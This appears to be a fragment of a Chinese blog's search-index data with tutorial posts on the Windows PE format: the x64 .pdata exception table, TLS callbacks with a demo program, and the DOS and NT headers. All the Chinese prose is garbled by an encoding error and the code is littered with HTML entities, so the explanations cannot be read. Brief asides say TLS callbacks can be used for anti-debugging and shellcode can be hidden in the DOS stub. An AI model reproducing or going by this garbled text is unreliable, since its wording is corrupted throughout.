æ¦‚è¿°ï¼šx86ç³»ç»Ÿé‡‡ç”¨åŠ¨æ€çš„æ–¹å¼æ„å»ºSEHç»“æ„ï¼Œç›¸æ¯”è€Œè¨€x64ç³»ç»Ÿä¸‹é‡‡ç”¨é™æ€çš„æ–¹å¼å¤„ç†SEHç»“æ„ï¼Œå®ƒä¿å­˜åœ¨PEæ–‡ä»¶ä¸­ï¼Œé€šå¸¸åœ¨.pdataåŒºæ®µã€‚å› æ­¤æœ¬æ–‡çš„ä¾‹å­é‡‡ç”¨x64ç¼–è¯‘è¿‡çš„ç¨‹åºã€‚å¼‚å¸¸è¡¨åœ¨èµ„æºè¡¨çš„åé¢ã€‚ 0x01 å¼‚å¸¸è¡¨è§£æ æ•°æ®ç›®å½•è¡¨çš„ç¬¬å››ä¸ªå…ƒç´ æŒ‡å‘å¼‚å¸¸è¡¨ï¼ŒRVAæŒ‡å‘çš„æ˜¯ä¸€ä¸ªIMAGE_IA64_RUNTIME_FUNCTION_ENTRYçš„ç»“æ„ä½“ï¼Œæœ¬ä¾‹çš„RVAæ˜¯0xA000ï¼ˆä¹Ÿå°±æ˜¯.pdataæ®µçš„èµ·å§‹ä½ç½®ï¼‰ï¼Œè½¬æ¢æˆoffsetæ˜¯0x7a00ã€‚å®ƒçš„ç»“æ„ä½“æ˜¯ï¼š 12345typedef struct _IMAGE_IA64_RUNTIME_FUNCTION_ENTRY &#123; DWORD BeginAddress; //ä¸SEHç›¸å…³ä»£ç çš„èµ·å§‹åç§»åœ°å€ DWORD EndAddress; //ä¸SEHç›¸å…³ä»£ç çš„æœ«å°¾åç§»åœ°å€ DWORD UnwindInfoAddress; //æŒ‡å‘æè¿°ä¸Šé¢ä¸¤ä¸ªå­—æ®µä¹‹é—´ä»£ç å¼‚å¸¸ä¿¡æ¯çš„UNWIND_INFO&#125; IMAGE_IA64_RUNTIME_FUNCTION_ENTRY, *PIMAGE_IA64_RUNTIME_FUNCTION_ENTRY; â€‹ BeginAddress ä¸ EndAddressä¹‹é—´ï¼Œæ˜¯å¼‚å¸¸å¤„ç†å‡½æ•°çš„å†…å®¹ã€‚UnwindInfoAddress æŒ‡å‘çš„ä½ç½®æ˜¯ç”¨æ¥æè¿° BeginAddress ä¸ EndAddress ä¹‹é—´çš„ä»£ç å¼‚å¸¸å±æ€§ä¿¡æ¯çš„UNWIND_INFOã€‚UNWIND_INFO ä¹Ÿå«ä½œå¼‚å¸¸å±•å¼€ä¿¡æ¯ï¼Œæ­¤ç»“æ„ç”¨æ¥æè¿°å †æ ˆæŒ‡é’ˆçš„è®°å½•å±æ€§ä¸å¯„å­˜å™¨ä¸­ä¿å­˜çš„åœ°å€å±æ€§ï¼Œå®ƒçš„ç»“æ„ä½“å¦‚ä¸‹ï¼š 1234567891011121314151617struct _UNWIND_INFO &#123; UBYTE Version:3; UBYTE Flags:5; UBYTE SizeOfProlog; UBYTE CountOfCodes; UBYTE FrameRegister:4; UBYTE FrameOffset:4; UNWIND_CODE UnwindCode[1]; union &#123; // If (Flags &amp; UNW_FLAG_EHANDLER) OPTIONAL ULONG ExceptionHandler;//å¼‚å¸¸/ç»ˆæ­¢å‡½æ•°çš„æ˜ åƒç›¸å¯¹åœ°å€æŒ‡é’ˆ // Else if (Flags &amp; UNW_FLAG_CHAININFO) OPTIONAL ULONG FunctionEntry;//å±•å¼€ä¿¡æ¯é“¾çš„æ˜ åƒç›¸å¯¹åœ°å€æŒ‡é’ˆ &#125;; // If (Flags &amp; UNW_FLAG_EHANDLER) ULONG ExceptionData[1];//å¼‚å¸¸å¤„ç†ç¨‹åºçš„æ•°æ®&#125; UNWIND_INFO, *PUNWIND_INFO; Version:å¼‚å¸¸å±•å¼€ä¿¡æ¯çš„ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬ä¸º0x001 Flags:å…±æœ‰å››ç§æ ‡å¿—ï¼š å½“å®ƒä¸º0x0çš„æ—¶å€™è¡¨ç¤ºUNW_FLAG_NHANDLERï¼Œæ²¡æœ‰å¼‚å¸¸å¤„ç†å‡½æ•°ã€‚ å½“å®ƒä¸º0x1çš„æ—¶å€™è¡¨ç¤ºUNW_FLAG_EHANDLERï¼Œæœ‰å¼‚å¸¸å¤„ç†å‡½æ•°ã€‚ å½“å®ƒä¸º0x2çš„æ—¶å€™è¡¨ç¤ºUNW_FLAG_UHANDLERï¼Œæœ‰ç³»ç»Ÿé»˜è®¤çš„å¤„ç†å‡½æ•°ã€‚ å½“å®ƒä¸º0x4çš„æ—¶å€™è¡¨ç¤ºUNW_FLAG_CHAININFOï¼Œè¡¨ç¤ºFunctionEntryæŒ‡å‘çš„æ˜¯å‰ä¸€ä¸ªRUNTIME_FUNCTIONçš„RAVã€‚ SizeOfProlog:å‡½æ•°èµ·å§‹éƒ¨åˆ†å­—èŠ‚çš„é•¿åº¦ CountOfCodes:UNWIND_INFOç»“æ„åŒ…å«çš„UNWIND_CODEç»“æ„æ•° FrameRegister:å¯„å­˜å™¨å¸§æŒ‡é’ˆï¼Œä¸º0åˆ™æŒ‡å®šå‡½æ•°ä¸ä½¿ç”¨æ¡†æ¶ FrameOffset:è‹¥ä¸Šé¢å­—æ®µä¸ä¸º0ï¼Œè¡¨ç¤ºå‡½æ•°åç§» UnwindCode:æŒ‡å®šæ°¸ä¹…æ€§å¯„å­˜å™¨ä¸RSPçš„æ•°ç»„é¡¹ç›®æ•° ExceptionHandler:å¼‚å¸¸å¥æŸ„ FunctionEntry:å±•å¼€ä¿¡æ¯é“¾ï¼ˆå‡½æ•°ï¼‰çš„æ˜ åƒç›¸å¯¹åœ°å€æŒ‡é’ˆï¼ˆå¦‚æœè®¾ç½®äº†UNW_FLAG_CHAININFOæ ‡è¯†ï¼‰ ExceptionData:å¼‚å¸¸å¤„ç†ç¨‹åºçš„æ•°æ® æŸ¥æ‰¾SEHè¡¨ ä»¥ä¸‹ä»£ç è¯´æ˜ï¼šæ‰“å¼€ä¸€ä¸ªè¿›ç¨‹æ¨¡å—ï¼Œç„¶åæŸ¥æ‰¾ .pdata æ®µï¼Œä¾æ¬¡éå†å¼‚å¸¸è¡¨ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293const char gPDataSectionName[] = &quot;.pdata&quot;;typedef struct _ModuleSectionInfo_T &#123; VOID* pBase; UINT Size;&#125;ModuleSectionInfo_T;// æŸ¥æ‰¾ .pdata æ®µåœ°å€å’Œå¤§å°BOOL getModulePdataSection( __in HANDLE hProcess, __in VOID * pModule, __out ModuleSectionInfo_T * pModuleSectionInfo)&#123; IMAGE_DOS_HEADER ImageDosHeader; IMAGE_NT_HEADERS ImageNtHeaders; IMAGE_SECTION_HEADER* pImageSectionHeader; UINT SectionIdx; IMAGE_SECTION_HEADER ImageSectionHeader; UCHAR* pBase = (UCHAR*)pModule; BOOL bResult = FALSE; if (!ReadProcessMemory(hProcess, pBase, &amp;ImageDosHeader, sizeof(ImageDosHeader), NULL)) goto End; if (ImageDosHeader.e_magic != IMAGE_DOS_SIGNATURE) goto End; if (!ReadProcessMemory(hProcess, pBase + ImageDosHeader.e_lfanew, &amp;ImageNtHeaders, sizeof(ImageNtHeaders), NULL)) goto End; if (ImageNtHeaders.Signature != IMAGE_NT_SIGNATURE) goto End; // // For 64bits, add the size of IMAGE_NT_HEADERS64 to its own base to get the base of the IMAGE_SECTION_HEADER table //#ifdef _WIN64#pragma warning(push)#pragma warning(disable:4127) if (SQLPLUGIN_IS_WOW64 == TRUE) pImageSectionHeader = (IMAGE_SECTION_HEADER*)((UINT_PTR)pBase + ImageDosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS));#pragma warning(pop) else#endif pImageSectionHeader = (IMAGE_SECTION_HEADER*)((UINT_PTR)pBase + ImageDosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS32)); for (SectionIdx = 0; SectionIdx &lt; ImageNtHeaders.FileHeader.NumberOfSections; SectionIdx++) &#123; if (!ReadProcessMemory(hProcess, &amp;pImageSectionHeader[SectionIdx], &amp;ImageSectionHeader, sizeof(ImageSectionHeader), NULL)) goto End; const char* SectionName = (const char*)ImageSectionHeader.Name; if (strncmp(SectionName, gPDataSectionName, sizeof(gPDataSectionName)) == 0) &#123; pModuleSectionInfo-&gt;pBase = pBase + ImageSectionHeader.VirtualAddress; pModuleSectionInfo-&gt;Size = ImageSectionHeader.Misc.VirtualSize; bResult = TRUE; break; &#125; &#125;End: return (bResult);&#125;BOOL getFunWithSepAddr(MODULEENTRY32 me32, ULONGLONG InputAddr, ULONGLONG&amp; RetAddr)&#123; BOOL bRet = FALSE; ModuleSectionInfo_T ModuleSectionInfo; ULONGLONG ulModuleBase = (ULONGLONG)me32.modBaseAddr; ULONGLONG ulModuleSize = (ULONGLONG)me32.modBaseSize; if (!getModulePdataSection(m_hProcess, me32.hModule, &amp;ModuleSectionInfo)) goto End; PVOID pCandidate; IMAGE_IA64_RUNTIME_FUNCTION_ENTRY RuntimeEntry;#pragma warning(push)#pragma warning(disable:4305) pCandidate = ModuleSectionInfo.pBase;#pragma warning(pop) unsigned int iCount = 0; // è¿™é‡Œéå†çš„å°±æ˜¯ SEH è¡¨ for (iCount = 0; iCount &lt; ModuleSectionInfo.Size; iCount += sizeof(IMAGE_IA64_RUNTIME_FUNCTION_ENTRY)) &#123; if (!ReadProcessMemory(m_hProcess, pCandidate, &amp;RuntimeEntry, sizeof(IMAGE_IA64_RUNTIME_FUNCTION_ENTRY), NULL)) goto NextCandidate; ULONGLONG begin = (ULONGLONG)ulModuleBase + RuntimeEntry.BeginAddress; ULONGLONG end = (ULONGLONG)ulModuleBase + RuntimeEntry.EndAddress; if (IsInThisFun(iCount, InputAddr, begin, end)) &#123; bRet = TRUE; RetAddr = begin; break; &#125; NextCandidate: pCandidate = (PVOID)((ULONGLONG)pCandidate + sizeof(IMAGE_IA64_RUNTIME_FUNCTION_ENTRY)); &#125;End: return bRet;&#125;","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"PE","slug":"PE","permalink":"https://hodlyounger.github.io/tags/PE/"},{"name":"Windows/PE","slug":"Windows-PE","permalink":"https://hodlyounger.github.io/tags/Windows-PE/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"PE","slug":"wiki/PE","permalink":"https://hodlyounger.github.io/categories/wiki/PE/"}]},{"title":"ã€PEã€‘PEæ–‡ä»¶ç»“æ„12-TLSè¡¨","date":"2024-08-31T01:41:20.167Z","path":"wiki/PE/ã€PEã€‘PEæ–‡ä»¶ç»“æ„12-TLSè¡¨/","text":"æ¦‚è¿°ï¼šTLS(TLSDirectory) çš„è¯´æ˜å’Œä½¿ç”¨ 0x01 TLS TLSå…¨ç§°çº¿ç¨‹å±€éƒ¨å­˜å‚¨å™¨ï¼Œå®ƒç”¨æ¥ä¿å­˜å˜é‡æˆ–å›è°ƒå‡½æ•°ã€‚ TLSé‡Œé¢çš„å˜é‡å’Œå›è°ƒå‡½æ•°éƒ½åœ¨ç¨‹åºå…¥å£ç‚¹ï¼ˆAddressOfEntryï¼‰ä¹‹å‰æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ç¨‹åºåœ¨è¢«è°ƒè¯•æ—¶ï¼Œè¿˜æ²¡æœ‰åœ¨å…¥å£ç‚¹å¤„æ–­ä¸‹æ¥ä¹‹å‰ï¼ŒTLSä¸­çš„å˜é‡å’Œå›è°ƒå‡½æ•°å°±å·²ç»æ‰§è¡Œå®Œäº†ï¼Œæ‰€ä»¥TLSå¯ä»¥ç”¨ä½œåè°ƒè¯•ä¹‹ç±»çš„æ“ä½œã€‚ TLSä¸­çš„å˜é‡å•ç‹¬å­˜åœ¨äºæ¯ä¸ªç‹¬ç«‹çš„çº¿ç¨‹å½“ä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹ä¸­å¯¹è¯¥å˜é‡çš„æ“ä½œéƒ½ä¸ä¼šå½±å“åˆ°å…¶ä»–çº¿ç¨‹ä¸­çš„TLSå˜é‡ã€‚ TLSå˜é‡çš„åˆ›å»ºæ–¹æ³•æœ‰ä¸¤ç§æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯åŠ¨æ€æ–¹å¼å’Œé™æ€æ–¹å¼ï¼ŒåŠ¨æ€æ–¹æ³•ä¼šç”¨åˆ°TlsAllocã€TlsFreeã€TlsSetValueã€TlsGetValueè¿™å‡ ä¸ªå‡½æ•°æ¥æ“ä½œå˜é‡ï¼Œé™æ€æ–¹æ³•ä¼šç”¨å£°æ˜__declspec (thread) int xx = 1;è¿™æ ·çš„æ–¹å¼æ¥åˆ›å»ºã€‚éœ€è¦æ³¨æ„çš„æ˜¯é™æ€åˆ›å»ºçš„TLSå˜é‡ä¸èƒ½ç”¨äºDLLåŠ¨æ€åº“ä¸­ã€‚ ç†è®ºè¯´çš„å¤šäº†æœªå…æœ‰ç‚¹æ¯ç‡¥ï¼Œå…ˆå†™ä¸ªå®ä¾‹å§ï¼Œè¯´æ˜å˜é‡å’Œå›è°ƒå‡½æ•°çš„åˆ›å»ºï¼Œè¿™æ ·æ˜ç™½çš„æ›´é€å½»ä¸€ç‚¹ã€‚ 0x02 TLSå®ä¾‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950__declspec (thread)int g_nNum = 0x11111111;__declspec (thread)char g_szStr[] = &quot;TLS g_nNum = 0x%p ...\\r\\n&quot;;void NTAPI t_TlsCallBack_A(PVOID DllHandle, DWORD Reason, PVOID Red)&#123; if (DLL_THREAD_DETACH == Reason) &#123; printf(&quot;t_TlsCallBack_A -&gt; ThreadDetach!\\r\\n&quot;); return; &#125;&#125;void NTAPI t_TlsCallBack_B(PVOID DllHandle, DWORD Reason, PVOID Red)&#123; if (DLL_THREAD_DETACH == Reason) &#123; printf(&quot;t_TlsCallBack_B -&gt; ThreadDetach!\\r\\n&quot;); return; &#125;&#125;#pragma data_seg(&quot;.CRT$XLB&quot;)PIMAGE_TLS_CALLBACK p_thread_callback[] = &#123; t_TlsCallBack_A, t_TlsCallBack_B, NULL&#125;;#pragma data_seg()DWORD WINAPI t_ThreadFun(PVOID pParam)&#123; printf(&quot;t_Thread -&gt; first printf:&quot;); printf(g_szStr, g_nNum); g_nNum = 0x2222222; printf(&quot;t_Thread -&gt; second printf:&quot;); printf(g_szStr, g_nNum); return 0;&#125;int _tmain()&#123; printf(&quot;_tmain -&gt; TlsDemo.exe is running...\\r\\n\\r\\n&quot;); CreateThread(NULL, 0, t_ThreadFun, NULL, 0, 0); Sleep(100); printf(&quot;\\r\\n&quot;); CreateThread(NULL, 0, t_ThreadFun, NULL, 0, 0); system(&quot;pause&quot;); return 0;&#125; é¦–å…ˆæˆ‘ä»¬çœ‹æ³¨å†ŒTLSå˜é‡çš„æ–¹å¼ï¼Œæœ¬ä¾‹å­ä½¿ç”¨çš„æ˜¯é™æ€æ–¹æ³•ä¹Ÿå°±æ˜¯__declspec (thread)int xx = 1;è¿™æ ·çš„æ–¹å¼æ¥åˆ›å»ºï¼Œè€Œæ³¨å†Œå›è°ƒå‡½æ•°ç›¸å¯¹æ¯”è¾ƒéº»çƒ¦ç‚¹ï¼Œæˆ‘ä»¬è¦å£°æ˜ä¸€ä¸ª#pragma data_seg(â€œ.CRT$XLBâ€)è¿™æ ·çš„å®å®šä¹‰å°†å›è°ƒå‡½æ•°åŒ…èµ·æ¥ï¼ŒCRTè¡¨æ˜ä½¿ç”¨C RunTimeæœºåˆ¶ï¼ŒXè¡¨ç¤ºæ ‡è¯†åéšæœºï¼ŒLè¡¨ç¤ºTLS callback sectionï¼ŒBå¯ä»¥æ˜¯B-Yä¹‹é—´ä»»æ„çš„å­—æ¯ã€‚ æˆ‘ä»¬è¿˜çœ‹è§å›è°ƒå‡½æ•°ä¼šåœ¨çº¿ç¨‹è¢«ç»ˆæ­¢æ—¶è°ƒç”¨ï¼Œå¹¶ä¸”è°ƒç”¨çš„é¡ºåºè·Ÿæ³¨å†Œå›è°ƒå‡½æ•°æ—¶ç›¸å…³ï¼Œå…¶å®å›è°ƒå‡½æ•°ä¸æ­¢ä¼šåœ¨çº¿ç¨‹ç»ˆæ­¢æ—¶è°ƒç”¨ï¼Œè¿˜æœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µä¼šè¢«è°ƒç”¨ã€‚ å…·ä½“çš„å‚è§ä»£ç å§ï¼Œæ‰“å°ç»“æœå¦‚ä¸‹ï¼š å¯ä»¥çœ‹è§ä¸¤ä¸ªçº¿ç¨‹å¯¹g_nNumçš„æ“ä½œå…¶å®æ˜¯äº’ä¸å½±å“çš„ï¼Œåœ¨ç¨‹åºè¿è¡Œåˆ°å…¥å£ç‚¹ä¹‹å‰ï¼Œg_nNumå·²ç»è¢«åˆå§‹åŒ–äº†ï¼Œä»¥åæ¯å¼€è¾Ÿä¸€æ¡æ–°çš„çº¿ç¨‹ï¼Œç³»ç»Ÿéƒ½ä¼šæ‹·è´ä¸€ä»½TLSå˜é‡çš„å‰¯æœ¬åˆ°è¯¥çº¿ç¨‹ä¸­ã€‚ 0x03 TLS è§£æ æ¥ä¸‹æ¥å¯¹TLSåœ¨PEæ–‡ä»¶ä¸­çš„ç»“æ„è¿›è¡Œè§£æã€‚TLSåœ¨PEä¸­æ•°æ®ç›®å½•è¡¨çš„ç¬¬10ä½ã€‚ é€šå¸¸ä¸€ä¸ªåŒ…å«äº†TLSè¡¨çš„ç¨‹åºï¼Œå®ƒå°±ä¼šæ‹¥æœ‰.tlsæ®µï¼Œè¿™ä¸ªæ®µé‡Œé¢ä¿å­˜äº†å˜é‡å’Œå›è°ƒå‡½æ•°çš„æ•°æ®ï¼Œä½†æ˜¯TLSè¡¨æœ¬èº«çš„ç»“æ„ä½“ä¸€èˆ¬å­˜åœ¨äº.rdataæ®µå†…ã€‚æœ¬æ–‡çš„ä¾‹å­ç¨‹åºçš„TLSè¡¨RVAæ˜¯0x2200ï¼Œé€šè¿‡è½¬æ¢ä¸ºoffsetå¾—åˆ°0x1000,æˆ‘ä»¬åˆ°0x1000å¤„çœ‹çœ‹åå…­è¿›åˆ¶å†å¯¹æ¯”ç»“æ„ä½“å­—æ®µå°±å¯ä»¥è§£æå‡ºTLSè¡¨äº†ã€‚ 123456789typedef struct _IMAGE_TLS_DIRECTORY32 &#123; DWORD StartAddressOfRawData; DWORD EndAddressOfRawData; PDWORD AddressOfIndex; PIMAGE_TLS_CALLBACK *AddressOfCallBacks; DWORD SizeOfZeroFill; DWORD Characteristics;&#125; IMAGE_TLS_DIRECTORY32 ä»¥ä¸Šè¿°ä»£ç ä¸ºä¾‹ï¼šç¼–è¯‘ x64-debug ç‰ˆæœ¬ååˆ†æå¦‚ä¸‹æ‰€ç¤ºï¼š å¯ä»¥çœ‹åˆ° .tls æ®µçš„èµ·å§‹åœ°å€ä¸º E200hã€‚ ä¹Ÿå°±æ˜¯.tls æ®µçš„åç§»åœ¨ E200hä½ç½®ï¼Œè·³è½¬åˆ° E200h çœ‹ä¸€ä¸‹ã€‚ ä» E2000h å¼€å§‹å°±å¯ä»¥ä½¿ç”¨ _IMAGE_TLS_DIRECTORY32 ç»“æ„ä½“è¯»å– tls è¡¨äº†ã€‚ åœ¨ tls æ®µå†…å­˜ä¸­å°±èƒ½çœ‹åˆ° TLS å˜é‡äº†","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"PE","slug":"PE","permalink":"https://hodlyounger.github.io/tags/PE/"},{"name":"Windows/PE","slug":"Windows-PE","permalink":"https://hodlyounger.github.io/tags/Windows-PE/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"PE","slug":"wiki/PE","permalink":"https://hodlyounger.github.io/categories/wiki/PE/"}]},{"title":"ã€PEã€‘PEæ–‡ä»¶ç»“æ„1","date":"2024-08-31T01:41:20.164Z","path":"wiki/PE/ã€PEã€‘PEæ–‡ä»¶ç»“æ„1/","text":"æ¦‚è¿°ï¼šPEæ–‡ä»¶ç»“æ„åŸºç¡€è®¤è¯†ä¹‹DOSå¤´å’ŒPEå¤´ï¼ˆä»¥ rpcrt4.dll ä¸ºä¾‹åˆ†æï¼‰ å‚è€ƒæ–‡ç« ï¼š â€˜PEæ–‡ä»¶æ ¼å¼å­¦ä¹ ï¼ˆä¸€ï¼‰æ¦‚è¿° - CodeAntennaâ€™ 0x01 å‰è¨€ PE(Portable Executable)ï¼Œå³å¯ç§»æ¤çš„æ‰§è¡Œä½“ã€‚ Linuxå¹³å°ï¼šELFï¼ˆExecutable and Linking Formatï¼‰æ–‡ä»¶ç»“æ„ã€‚ Windowså¹³å°ä¸‹ï¼Œæ‰€æœ‰çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚è¯¸å¦‚ï¼šexeã€dllã€sysã€ocxã€comç­‰å‡é€‚ç”¨PEæ–‡ä»¶ç»“æ„ï¼Œè¿™äº›ä½¿ç”¨PEæ–‡ä»¶ç»“æ„ä¹Ÿè¢«ç§°ä¸ºPEæ–‡ä»¶ã€‚ 0x02 PEç»“æ„ PE ç»“æ„æ˜¯ç”±è‹¥å¹²ä¸ªå¤æ‚çš„ç»“æ„ä½“ç»„åˆè€Œæˆçš„ï¼Œä¸æ˜¯å•å•çš„ä¸€ä¸ªç»“æ„ä½“é‚£ä¹ˆç®€å•ï¼Œå®ƒçš„ç»“æ„å°±åƒæ–‡ä»¶ç³»ç»Ÿçš„ç»“æ„æ˜¯ç”±å¤šä¸ªç»“æ„ä½“ç»„æˆçš„ã€‚PEç»“æ„ åŒ…å«çš„ç»“æ„ä½“æœ‰ DOS å¤´ã€PE æ ‡è¯†ã€æ–‡ä»¶å¤´ã€å¯é€‰å¤´ã€ç›®å½•ç»“æ„ã€èŠ‚è¡¨ç­‰ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š DOSå¤´ DOSå¤´ä¸­å£°æ˜ç”¨çš„å¯„å­˜å™¨(æˆ‘ä»¬å¯ä»¥çœ‹åˆ°e_ssã€e_spã€e_ipã€e_csè¿˜æ˜¯16ä½çš„å¯„å­˜å™¨)ï¼Œæ‰€ä»¥åœ¨32ä½/64ä¸ºç³»ç»Ÿä¸­ç”¨åˆ°çš„åªæœ‰ä¸¤ä¸ªæˆå‘˜äº†ï¼ˆç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªï¼‰ã€‚æ— è®ºæ˜¯32ä½è¿˜æ˜¯64ä½PEæ–‡ä»¶ï¼Œå…¶æ–‡ä»¶çš„å¤´éƒ¨å¿…å®šæ˜¯DOSå¤´ã€‚å¤§å°ä¸º 40H(64å­—èŠ‚)ã€‚ç›¸å…³ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718192021222324// WORD ä¸º2å­—èŠ‚// DWORD ä¸º4å­—èŠ‚typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header(â€»Magic DOS signature MZ(4Dh 5Ah):MZæ ‡è®°) WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; DOS å¤´åˆåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼ŒMZå¤´éƒ¨ å’Œ DOSå­˜æ ¹ã€‚ MZå¤´éƒ¨ MZæ–‡ä»¶å¤´ï¼šIMAGE_DOS_HEADER ç»“æ„ä½“ï¼Œå…¶å¤§å°å 64ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸”è¯¥ç»“æ„ä¸­çš„æœ€åä¸€ä¸ªLONGç±»å‹e_lfanewæˆå‘˜æŒ‡å‘PEæ–‡ä»¶å¤´çš„ä½ç½®ä¸ºä¸­çš„PEæ–‡ä»¶å¤´æ ‡å¿—çš„åœ°å€ã€‚ DOSå¤´ä¸­æœ‰ä¸¤ä¸ªé‡è¦çš„æˆå‘˜ï¼Œåˆ†åˆ«æ˜¯ e_magic å’Œ e_lfanewï¼Œå¦‚PEæ–‡ä»¶ç»“æ„è¯´æ˜ä¸€å›¾æ‰€ç¤ºï¼š e_magicï¼šå¯¹åº” MZæ ‡è¯†(å›ºå®šå€¼) ï¼Œä¹Ÿå°±æ˜¯ 0x5A4D e_lfanew: æŒ‡peçš„åç§»é‡ï¼Œå¯¹åº”çš„PEæ•°æ®å—çš„åŸºåœ°å€ DOSå­˜æ ¹ï¼ˆDOS stubï¼‰ DOSå¤´(IMAGE_DOS_HEADER)å’ŒPEå¤´(IMAGE_NT_HEADERS)ä¸­é—´çš„ç©ºä½™ä½ç½®æ˜¯ä¸€äº›åƒåœ¾å€¼ä»¥åŠç¼–è¯‘å™¨å¡«å……çš„ä¸€äº› *The is program cannot be run in DOS mode.*æˆ– This program must be run under Win32 ç­‰ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯å°±æ˜¯ DOSå­˜æ ¹ã€‚DOSå­˜æ ¹å®é™…ä¸Šæ˜¯ä¸€æ®µæ±‡ç¼–ä»£ç ã€‚ç”¨äºåœ¨DOSç¯å¢ƒä¸‹å¯åŠ¨PEæ–‡ä»¶æ—¶è¾“å‡ºä¸€äº›ä¸Šè¿°æ–‡æœ¬ã€‚ åœ¨peæ–‡ä»¶åˆ©ç”¨çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠpayloadå†™å…¥åˆ°å½“å‰åŒºåŸŸï¼Œè¯¸å¦‚å­˜æ”¾æˆ‘ä»¬çš„shellcodeï¼Œåœ¨è¯»å–æ—¶ï¼Œè·å–doså¤´å­—èŠ‚æ•°ï¼Œå‡å»MZå¤´å­—èŠ‚æ•°ï¼Œå³ä¸ºdoså­˜æ ¹å­—èŠ‚å¤§å°ã€‚ç„¶åæ‹¿å»æ“ä½œåŠ è½½shellcodeç­‰ã€‚ PEå¤´ åœ¨MS-DOSå¤´ä¸‹mainï¼Œå°±æ˜¯PEå¤´ï¼ŒPEå¤´æ˜¯PEç›¸å…³ç»“æ„NTæ˜ åƒå¤´ï¼ˆIMAGE_NT_HEADERï¼‰çš„ç®€ç§°ï¼Œå…¶ä¸­åŒ…å«è®¸å¤šPEè£…è½½å™¨ç”¨åˆ°çš„é‡è¦å­—æ®µã€‚PEå¤´åˆåˆ†ä¸ºæ ‡å‡†PEå¤´å’Œå¯é€‰PEå¤´ï¼Œå…¶åŒä¸ºNTç»“æ„çš„æˆå‘˜ï¼š IMAGE_NT_HEADERæ•°æ®ç»“æ„å®šä¹‰ï¼š 1234567//NTå¤´//pNTHeader = dosHeader + dosHeader-&gt;e_lfanew;struct _IMAGE_NT_HEADERS&#123; 0x00 DWORD Signature; //PEæ–‡ä»¶æ ‡è¯†:ASCIIçš„&quot;PE\\0\\0&quot; 0x04 _IMAGE_FILE_HEADER FileHeader; 0x18 _IMAGE_OPTIONAL_HEADER OptionalHeader;&#125;; æ ¹æ®DOSå¤´çš„e_lfanewæˆå‘˜æˆ‘ä»¬å°±å¯ä»¥æ‰¾åˆ°NTå¤´ï¼ŒNTå¤´çš„ç¬¬ä¸€ä¸ªæˆå‘˜Signatureæ˜¯PE\\0\\0ï¼ˆ0X50 0X45 0X00 0X00å››å­—èŠ‚çš„ç­¾åï¼‰ï¼Œåä¸¤ä¸ªæˆå‘˜åˆ™åˆ†åˆ«æ˜¯æ ‡å‡†PEå¤´FileHeaderï¼ˆ_IMAGE_FILE_HEADERï¼‰å’ŒOptionalHeaderå¯é€‰PEå¤´ï¼ˆ_IMAGE_OPTIONAL_HEADERï¼‰ã€‚ PEæ ‡è¯† Signature å°†æ–‡ä»¶æ ‡è¯†ä¸º PE æ˜ åƒçš„ 4 å­—èŠ‚ç­¾åã€‚å­—èŠ‚ä¸ºPE\\0\\0ã€‚è¿™ä¸ªå­—æ®µæ˜¯PEæ–‡ä»¶çš„æ ‡å¿—å­—æ®µï¼Œé€šå¸¸è®¾ç½®æˆ 00004550hï¼Œå…¶ASCIIç ä¸º PE00ï¼Œè¿™ä¸ªå­—æ®µæ˜¯PEæ–‡ä»¶å¤´çš„å¼€å§‹ï¼Œå‰é¢çš„DOS_HEADERç»“æ„ä¸­çš„å­—æ®µe_lfanewå­—æ®µå°±æ˜¯æŒ‡å‘è¿™é‡Œã€‚ æ–‡ä»¶å¤´ FileHeader æ–‡ä»¶å¤´ç»“æ„ä½“ä¸º _IMAGE_FILE_HEADERï¼Œè§IMAGE_FILE_HEADER (winnt.h) - Win32 apps | Microsoft Learnã€‚ç»“æ„ä½“æˆå‘˜å˜é‡å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; //è¿è¡Œå¹³å° WORD NumberOfSections; //æ–‡ä»¶çš„åŒºå—æ•°ç›® DWORD TimeDateStamp; //æ–‡ä»¶åˆ›å»ºçš„ç”¨æ—¶é—´æˆ³æ ‡è¯†çš„æ—¥æœŸ DWORD PointerToSymbolTable; 